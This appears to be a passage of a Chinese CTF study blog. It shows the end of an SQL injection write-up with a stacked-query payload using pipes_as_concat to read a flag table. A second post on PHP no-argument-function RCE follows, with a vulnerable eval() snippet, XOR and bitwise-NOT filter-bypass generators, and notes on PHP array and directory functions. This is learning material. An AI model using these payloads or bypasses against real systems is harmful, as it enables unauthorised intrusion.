<p><strong>select 1 from 的意思其实是建立一个临时列，这个列的所有初始值都被设为1。</strong></p>
<p>解法2</p>
<p>先上payload:<br> <code>1;set sql_mode=pipes_as_concat;select 1</code><br> 其实这个不用百度。。。。<br> 你直接看这英语意思：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipes_as_concat</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>就是把 || 设置成了 concat函数呗。。。</strong><br> 这也是猜出了后端代码的。</p>
<p><strong>但是要注意分号隔断了前面的命令，所以要再次添加select!!</strong></p>
<p>上面那句执行是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(<span class="number">1</span>,flag) <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210126221612719.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2021/01/23/sql%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%8512/" data-id="ckkf0um3300005kv38w9r32rx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记11" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/" class="article-date">
  <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/">PHP小知识</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="无参函数RCE"><a href="#无参函数RCE" class="headerlink" title="无参函数RCE"></a>无参函数RCE</h3><p>*只使用函数，且函数不能带有参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit] )</span><br></pre></td></tr></table></figure>

<p><code>pattern</code>：要搜索的模式，可以是字符串或一个字符串数组</p>
<p><code>replacement</code>：用于替换的字符串或字符串数组</p>
<p><code>subject</code>：要搜索替换的目标字符串或字符串数组</p>
<p><code>limit</code>：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）</p>
<p><code>count</code>：可选，为替换执行的次数</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(pattern, replacement, subject)</span><br></pre></td></tr></table></figure>

<p>即：将<code>subject</code>中符合<code>pattern</code>的替换为<code>replacement</code></p>
<p>对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p>
<p>意思是，对传进来的code进行正则匹配，符合正则表达式的部分替换为空，然后返回一个新的字符串</p>
<h3 id="preg-match-匹配未被过滤脚本"><a href="#preg-match-匹配未被过滤脚本" class="headerlink" title="preg_match()匹配未被过滤脚本"></a>preg_match()匹配未被过滤脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($a&#x3D; 0; $a&lt; 256; $a++) &#123;</span><br><span class="line">    if (!preg_match(&quot;&#x2F;[\w$&#x3D;()&lt;&gt;&#39;\&quot;]&#x2F;&quot;, chr($a))) &#123;</span><br><span class="line">        echo (chr($a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>*异或的符号是<code>^</code>,是一种运算符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 &#x3D; 0</span><br><span class="line">1 ^ 0 &#x3D; 1</span><br><span class="line">0 ^ 1 &#x3D; 1</span><br><span class="line">0 ^ 0 &#x3D; 0</span><br></pre></td></tr></table></figure>

<h4 id="异或脚本"><a href="#异或脚本" class="headerlink" title="异或脚本"></a>异或脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i&#x3D;128;$i&lt;255;$i++)&#123;</span><br><span class="line">    echo sprintf(&quot;%s^%s&quot;,urlencode(chr($i)),urlencode(chr(255))).&quot;&#x3D;&gt;&quot;. (chr($i)^chr(255)).&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">%80^%FF&#x3D;&gt;</span><br><span class="line">%81^%FF&#x3D;&gt;~</span><br><span class="line">%82^%FF&#x3D;&gt;&#125;</span><br><span class="line">%83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;</span><br><span class="line">%85^%FF&#x3D;&gt;z</span><br><span class="line">%86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x</span><br><span class="line">%88^%FF&#x3D;&gt;w</span><br><span class="line">%89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u</span><br><span class="line">%8B^%FF&#x3D;&gt;t</span><br><span class="line">%8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r</span><br><span class="line">%8E^%FF&#x3D;&gt;q</span><br><span class="line">%8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o</span><br><span class="line">%91^%FF&#x3D;&gt;n</span><br><span class="line">%92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l</span><br><span class="line">%94^%FF&#x3D;&gt;k</span><br><span class="line">%95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i</span><br><span class="line">%97^%FF&#x3D;&gt;h</span><br><span class="line">%98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f</span><br><span class="line">%9A^%FF&#x3D;&gt;e</span><br><span class="line">%9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c</span><br><span class="line">%9D^%FF&#x3D;&gt;b</span><br><span class="line">%9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;</span><br><span class="line">%A0^%FF&#x3D;&gt;_</span><br><span class="line">%A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]</span><br><span class="line">%A3^%FF&#x3D;&gt;\</span><br><span class="line">%A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z</span><br><span class="line">%A6^%FF&#x3D;&gt;Y</span><br><span class="line">%A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W</span><br><span class="line">%A9^%FF&#x3D;&gt;V</span><br><span class="line">%AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T</span><br><span class="line">%AC^%FF&#x3D;&gt;S</span><br><span class="line">%AD^%FF&#x3D;&gt;R</span><br><span class="line">%AE^%FF&#x3D;&gt;Q</span><br><span class="line">%AF^%FF&#x3D;&gt;P</span><br><span class="line">%B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N</span><br><span class="line">%B2^%FF&#x3D;&gt;M</span><br><span class="line">%B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K</span><br><span class="line">%B5^%FF&#x3D;&gt;J</span><br><span class="line">%B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H</span><br><span class="line">%B8^%FF&#x3D;&gt;G</span><br><span class="line">%B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E</span><br><span class="line">%BB^%FF&#x3D;&gt;D</span><br><span class="line">%BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B</span><br><span class="line">%BE^%FF&#x3D;&gt;A</span><br><span class="line">%BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br><span class="line">%C1^%FF&#x3D;&gt;&gt;</span><br><span class="line">%C2^%FF&#x3D;&gt;&#x3D;</span><br><span class="line">%C3^%FF&#x3D;&gt;&lt;</span><br><span class="line">%C4^%FF&#x3D;&gt;;</span><br><span class="line">%C5^%FF&#x3D;&gt;:</span><br><span class="line">%C6^%FF&#x3D;&gt;9</span><br><span class="line">%C7^%FF&#x3D;&gt;8</span><br><span class="line">%C8^%FF&#x3D;&gt;7</span><br><span class="line">%C9^%FF&#x3D;&gt;6</span><br><span class="line">%CA^%FF&#x3D;&gt;5</span><br><span class="line">%CB^%FF&#x3D;&gt;4</span><br><span class="line">%CC^%FF&#x3D;&gt;3</span><br><span class="line">%CD^%FF&#x3D;&gt;2</span><br><span class="line">%CE^%FF&#x3D;&gt;1</span><br><span class="line">%CF^%FF&#x3D;&gt;0</span><br><span class="line">%D0^%FF&#x3D;&gt;&#x2F;</span><br><span class="line">%D1^%FF&#x3D;&gt;.</span><br><span class="line">%D2^%FF&#x3D;&gt;-</span><br><span class="line">%D3^%FF&#x3D;&gt;,</span><br><span class="line">%D4^%FF&#x3D;&gt;+</span><br><span class="line">%D5^%FF&#x3D;&gt;*</span><br><span class="line">%D6^%FF&#x3D;&gt;)</span><br><span class="line">%D7^%FF&#x3D;&gt;(</span><br><span class="line">%D8^%FF&#x3D;&gt;&#39;</span><br><span class="line">%D9^%FF&#x3D;&gt;&amp;</span><br><span class="line">%DA^%FF&#x3D;&gt;%</span><br><span class="line">%DB^%FF&#x3D;&gt;$</span><br><span class="line">%DC^%FF&#x3D;&gt;#</span><br><span class="line">%DD^%FF&#x3D;&gt;&quot;</span><br><span class="line">%DE^%FF&#x3D;&gt;!</span><br><span class="line">%DF^%FF&#x3D;&gt; </span><br><span class="line">%E0^%FF&#x3D;&gt;</span><br><span class="line">%E1^%FF&#x3D;&gt;</span><br><span class="line">%E2^%FF&#x3D;&gt;</span><br><span class="line">%E3^%FF&#x3D;&gt;</span><br><span class="line">%E4^%FF&#x3D;&gt;</span><br><span class="line">%E5^%FF&#x3D;&gt;</span><br><span class="line">%E6^%FF&#x3D;&gt;</span><br><span class="line">%E7^%FF&#x3D;&gt;</span><br><span class="line">%E8^%FF&#x3D;&gt;</span><br><span class="line">%E9^%FF&#x3D;&gt;</span><br><span class="line">%EA^%FF&#x3D;&gt;</span><br><span class="line">%EB^%FF&#x3D;&gt;</span><br><span class="line">%EC^%FF&#x3D;&gt;</span><br><span class="line">%ED^%FF&#x3D;&gt;</span><br><span class="line">%EE^%FF&#x3D;&gt;</span><br><span class="line">%EF^%FF&#x3D;&gt;</span><br><span class="line">%F0^%FF&#x3D;&gt;</span><br><span class="line">%F1^%FF&#x3D;&gt;</span><br><span class="line">%F2^%FF&#x3D;&gt;</span><br><span class="line">%F3^%FF&#x3D;&gt;</span><br><span class="line">%F4^%FF&#x3D;&gt;</span><br><span class="line">%F5^%FF&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">%F6^%FF&#x3D;&gt;	</span><br><span class="line">%F7^%FF&#x3D;&gt;</span><br><span class="line">%F8^%FF&#x3D;&gt;</span><br><span class="line">%F9^%FF&#x3D;&gt;</span><br><span class="line">%FA^%FF&#x3D;&gt;</span><br><span class="line">%FB^%FF&#x3D;&gt;</span><br><span class="line">%FC^%FF&#x3D;&gt;</span><br><span class="line">%FD^%FF&#x3D;&gt;</span><br><span class="line">%FE^%FF&#x3D;&gt;</span><br><span class="line">[Finished in 0.2s]</span><br></pre></td></tr></table></figure>

<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>*取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0</p>
<h4 id="取反脚本"><a href="#取反脚本" class="headerlink" title="取反脚本"></a>取反脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; urlencode(~&#39;phpinfo&#39;);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h3><h4 id="•show-source-—-highlight-file"><a href="#•show-source-—-highlight-file" class="headerlink" title="•show_source()—-highlight_file()"></a>•show_source()—-highlight_file()</h4><p>*函数对文件进行 PHP 语法高亮显示</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(filename,return)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>filename</em></td>
<td>必需。规定要显示的文件。</td>
</tr>
<tr>
<td><em>return</em></td>
<td>可选。如果该参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。默认是 FALSE。</td>
</tr>
</tbody></table>
<h4 id="•localeconv"><a href="#•localeconv" class="headerlink" title="•localeconv()"></a>•localeconv()</h4><ul>
<li><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p>
<p>localeconv() 函数返回以下数组元素：</p>
<ul>
<li>[decimal_point] - 小数点字符</li>
<li>[thousands_sep] - 千位分隔符</li>
<li>[int_curr_symbol] - 货币符号 （例如：USD）</li>
<li>[currency_symbol] - 货币符号 （例如：$）</li>
<li>[mon_decimal_point] - 货币小数点字符</li>
<li>[mon_thousands_sep] - 货币千位分隔符</li>
<li>[positive_sign] - 正值字符</li>
<li>[negative_sign] - 负值字符</li>
<li>[int_frac_digits] - 国际通用小数位</li>
<li>[frac_digits] - 本地通用小数位</li>
<li>[p_cs_precedes] - 如果货币符号在一个正数值之前显示，则为 True（1），如果在正数值之后显示，则为 False（0）</li>
<li>[p_sep_by_space] - 如果在货币符号和正数值之间包含空格，则为 True（1），否则为 False（0）</li>
<li>[n_cs_precedes] - 如果货币符号在一个负数值之前显示，则为 True（1），如果在负数值之后显示，则为 False（0）</li>
<li>[n_sep_by_space] - 如果在货币符号和负数值之间包含空格，则为 True（1），否则为 False（0）</li>
<li>[p_sign_posn] - 格式化选项：<ul>
<li>0 - 把数量和货币符号写在圆括号内</li>
<li>1 - 在数量和货币符号之前加上 + 号</li>
<li>2 - 在数量和货币符号之后加上 + 号</li>
<li>3 - 直接在货币符号之前加上 + 号</li>
<li>4 - 直接在货币符号之后加上 + 号</li>
</ul>
</li>
<li>[n_sign_posn] - 格式化选项：<ul>
<li>0 - 把数量和货币符号写在圆括号内</li>
<li>1 - 在数量和货币符号之前加上 - 号</li>
<li>2 - 在数量和货币符号之后加上 - 号</li>
<li>3 - 直接在货币符号之前加上 - 号</li>
<li>4 - 直接在货币符号之后加上 - 号</li>
</ul>
</li>
<li>[grouping] - 显示数字组合形式的数组（例如：3 指示 1 000 000）</li>
<li>[mon_grouping] - 显示货币数字组合形式的数组（例如：2 指示 1 00 00 00）</li>
</ul>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201220234003433.png"></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">array(18) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_curr_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;currency_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;positive_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;negative_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;mon_grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="•pos-—•current"><a href="#•pos-—•current" class="headerlink" title="•pos()—•current()"></a>•pos()—•current()</h4><p>*输出数组中的当前元素的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo pos($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153746288.png"></p>
<h4 id="•end"><a href="#•end" class="headerlink" title="•end()"></a>•end()</h4><p>*输出数组中的当前元素和最后一个元素的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo end($people); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153648776.png"></p>
<h4 id="•next"><a href="#•next" class="headerlink" title="•next ()"></a>•next ()</h4><p>*输出数组中的当前元素和下一个元素的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo next($people);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153542284.png"></p>
<h4 id="•prev"><a href="#•prev" class="headerlink" title="•prev()"></a>•prev()</h4><p>*输出数组中的当前元素、下一个元素和上一个元素的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo next($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo prev($people);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153432353.png"></p>
<h4 id="•reset"><a href="#•reset" class="headerlink" title="•reset()"></a>•reset()</h4><p>*输出数组中的当前元素和下一个元素的值，然后重置数组的内部指针到数组中的第一个元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo next($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo reset($people);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153325869.png"></p>
<h4 id="•each"><a href="#•each" class="headerlink" title="•each()"></a>•each()</h4><p>*函数生成一个由数组当前内部指针所指向的元素的键名和键值组成的数组，并把内部指针向前移动</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">each(array)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>array</td>
<td>必需。规定要使用的数组。</td>
</tr>
</tbody></table>
<h4 id="•scandir"><a href="#•scandir" class="headerlink" title="•scandir()"></a>•scandir()</h4><p>*函数返回指定目录中的文件和目录的数组</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir(directory, sorting_order, context);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>directory</em></td>
<td>必需。规定要扫描的目录。</td>
</tr>
<tr>
<td><em>sorting_order</em></td>
<td>可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td>
</tr>
<tr>
<td><em>context</em></td>
<td>可选。规定目录句柄的环境。context 是可修改目录流的行为的一套选项。</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201222233153591.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201222233355025.png"></p>
<h4 id="•chdir"><a href="#•chdir" class="headerlink" title="•chdir()"></a>•chdir()</h4><p>*函数改变当前的目录</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(directory)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>directory</em></td>
<td>必需。规定新的当前目录。</td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(%E2%80%98.%E2%80%99));%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89">http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(‘.’)); </a></p>
<h5 id="chdir-‘-’"><a href="#chdir-‘-’" class="headerlink" title="chdir(‘.’)"></a>chdir(‘.’)</h5><p>如果没有返回上一层目录</p>
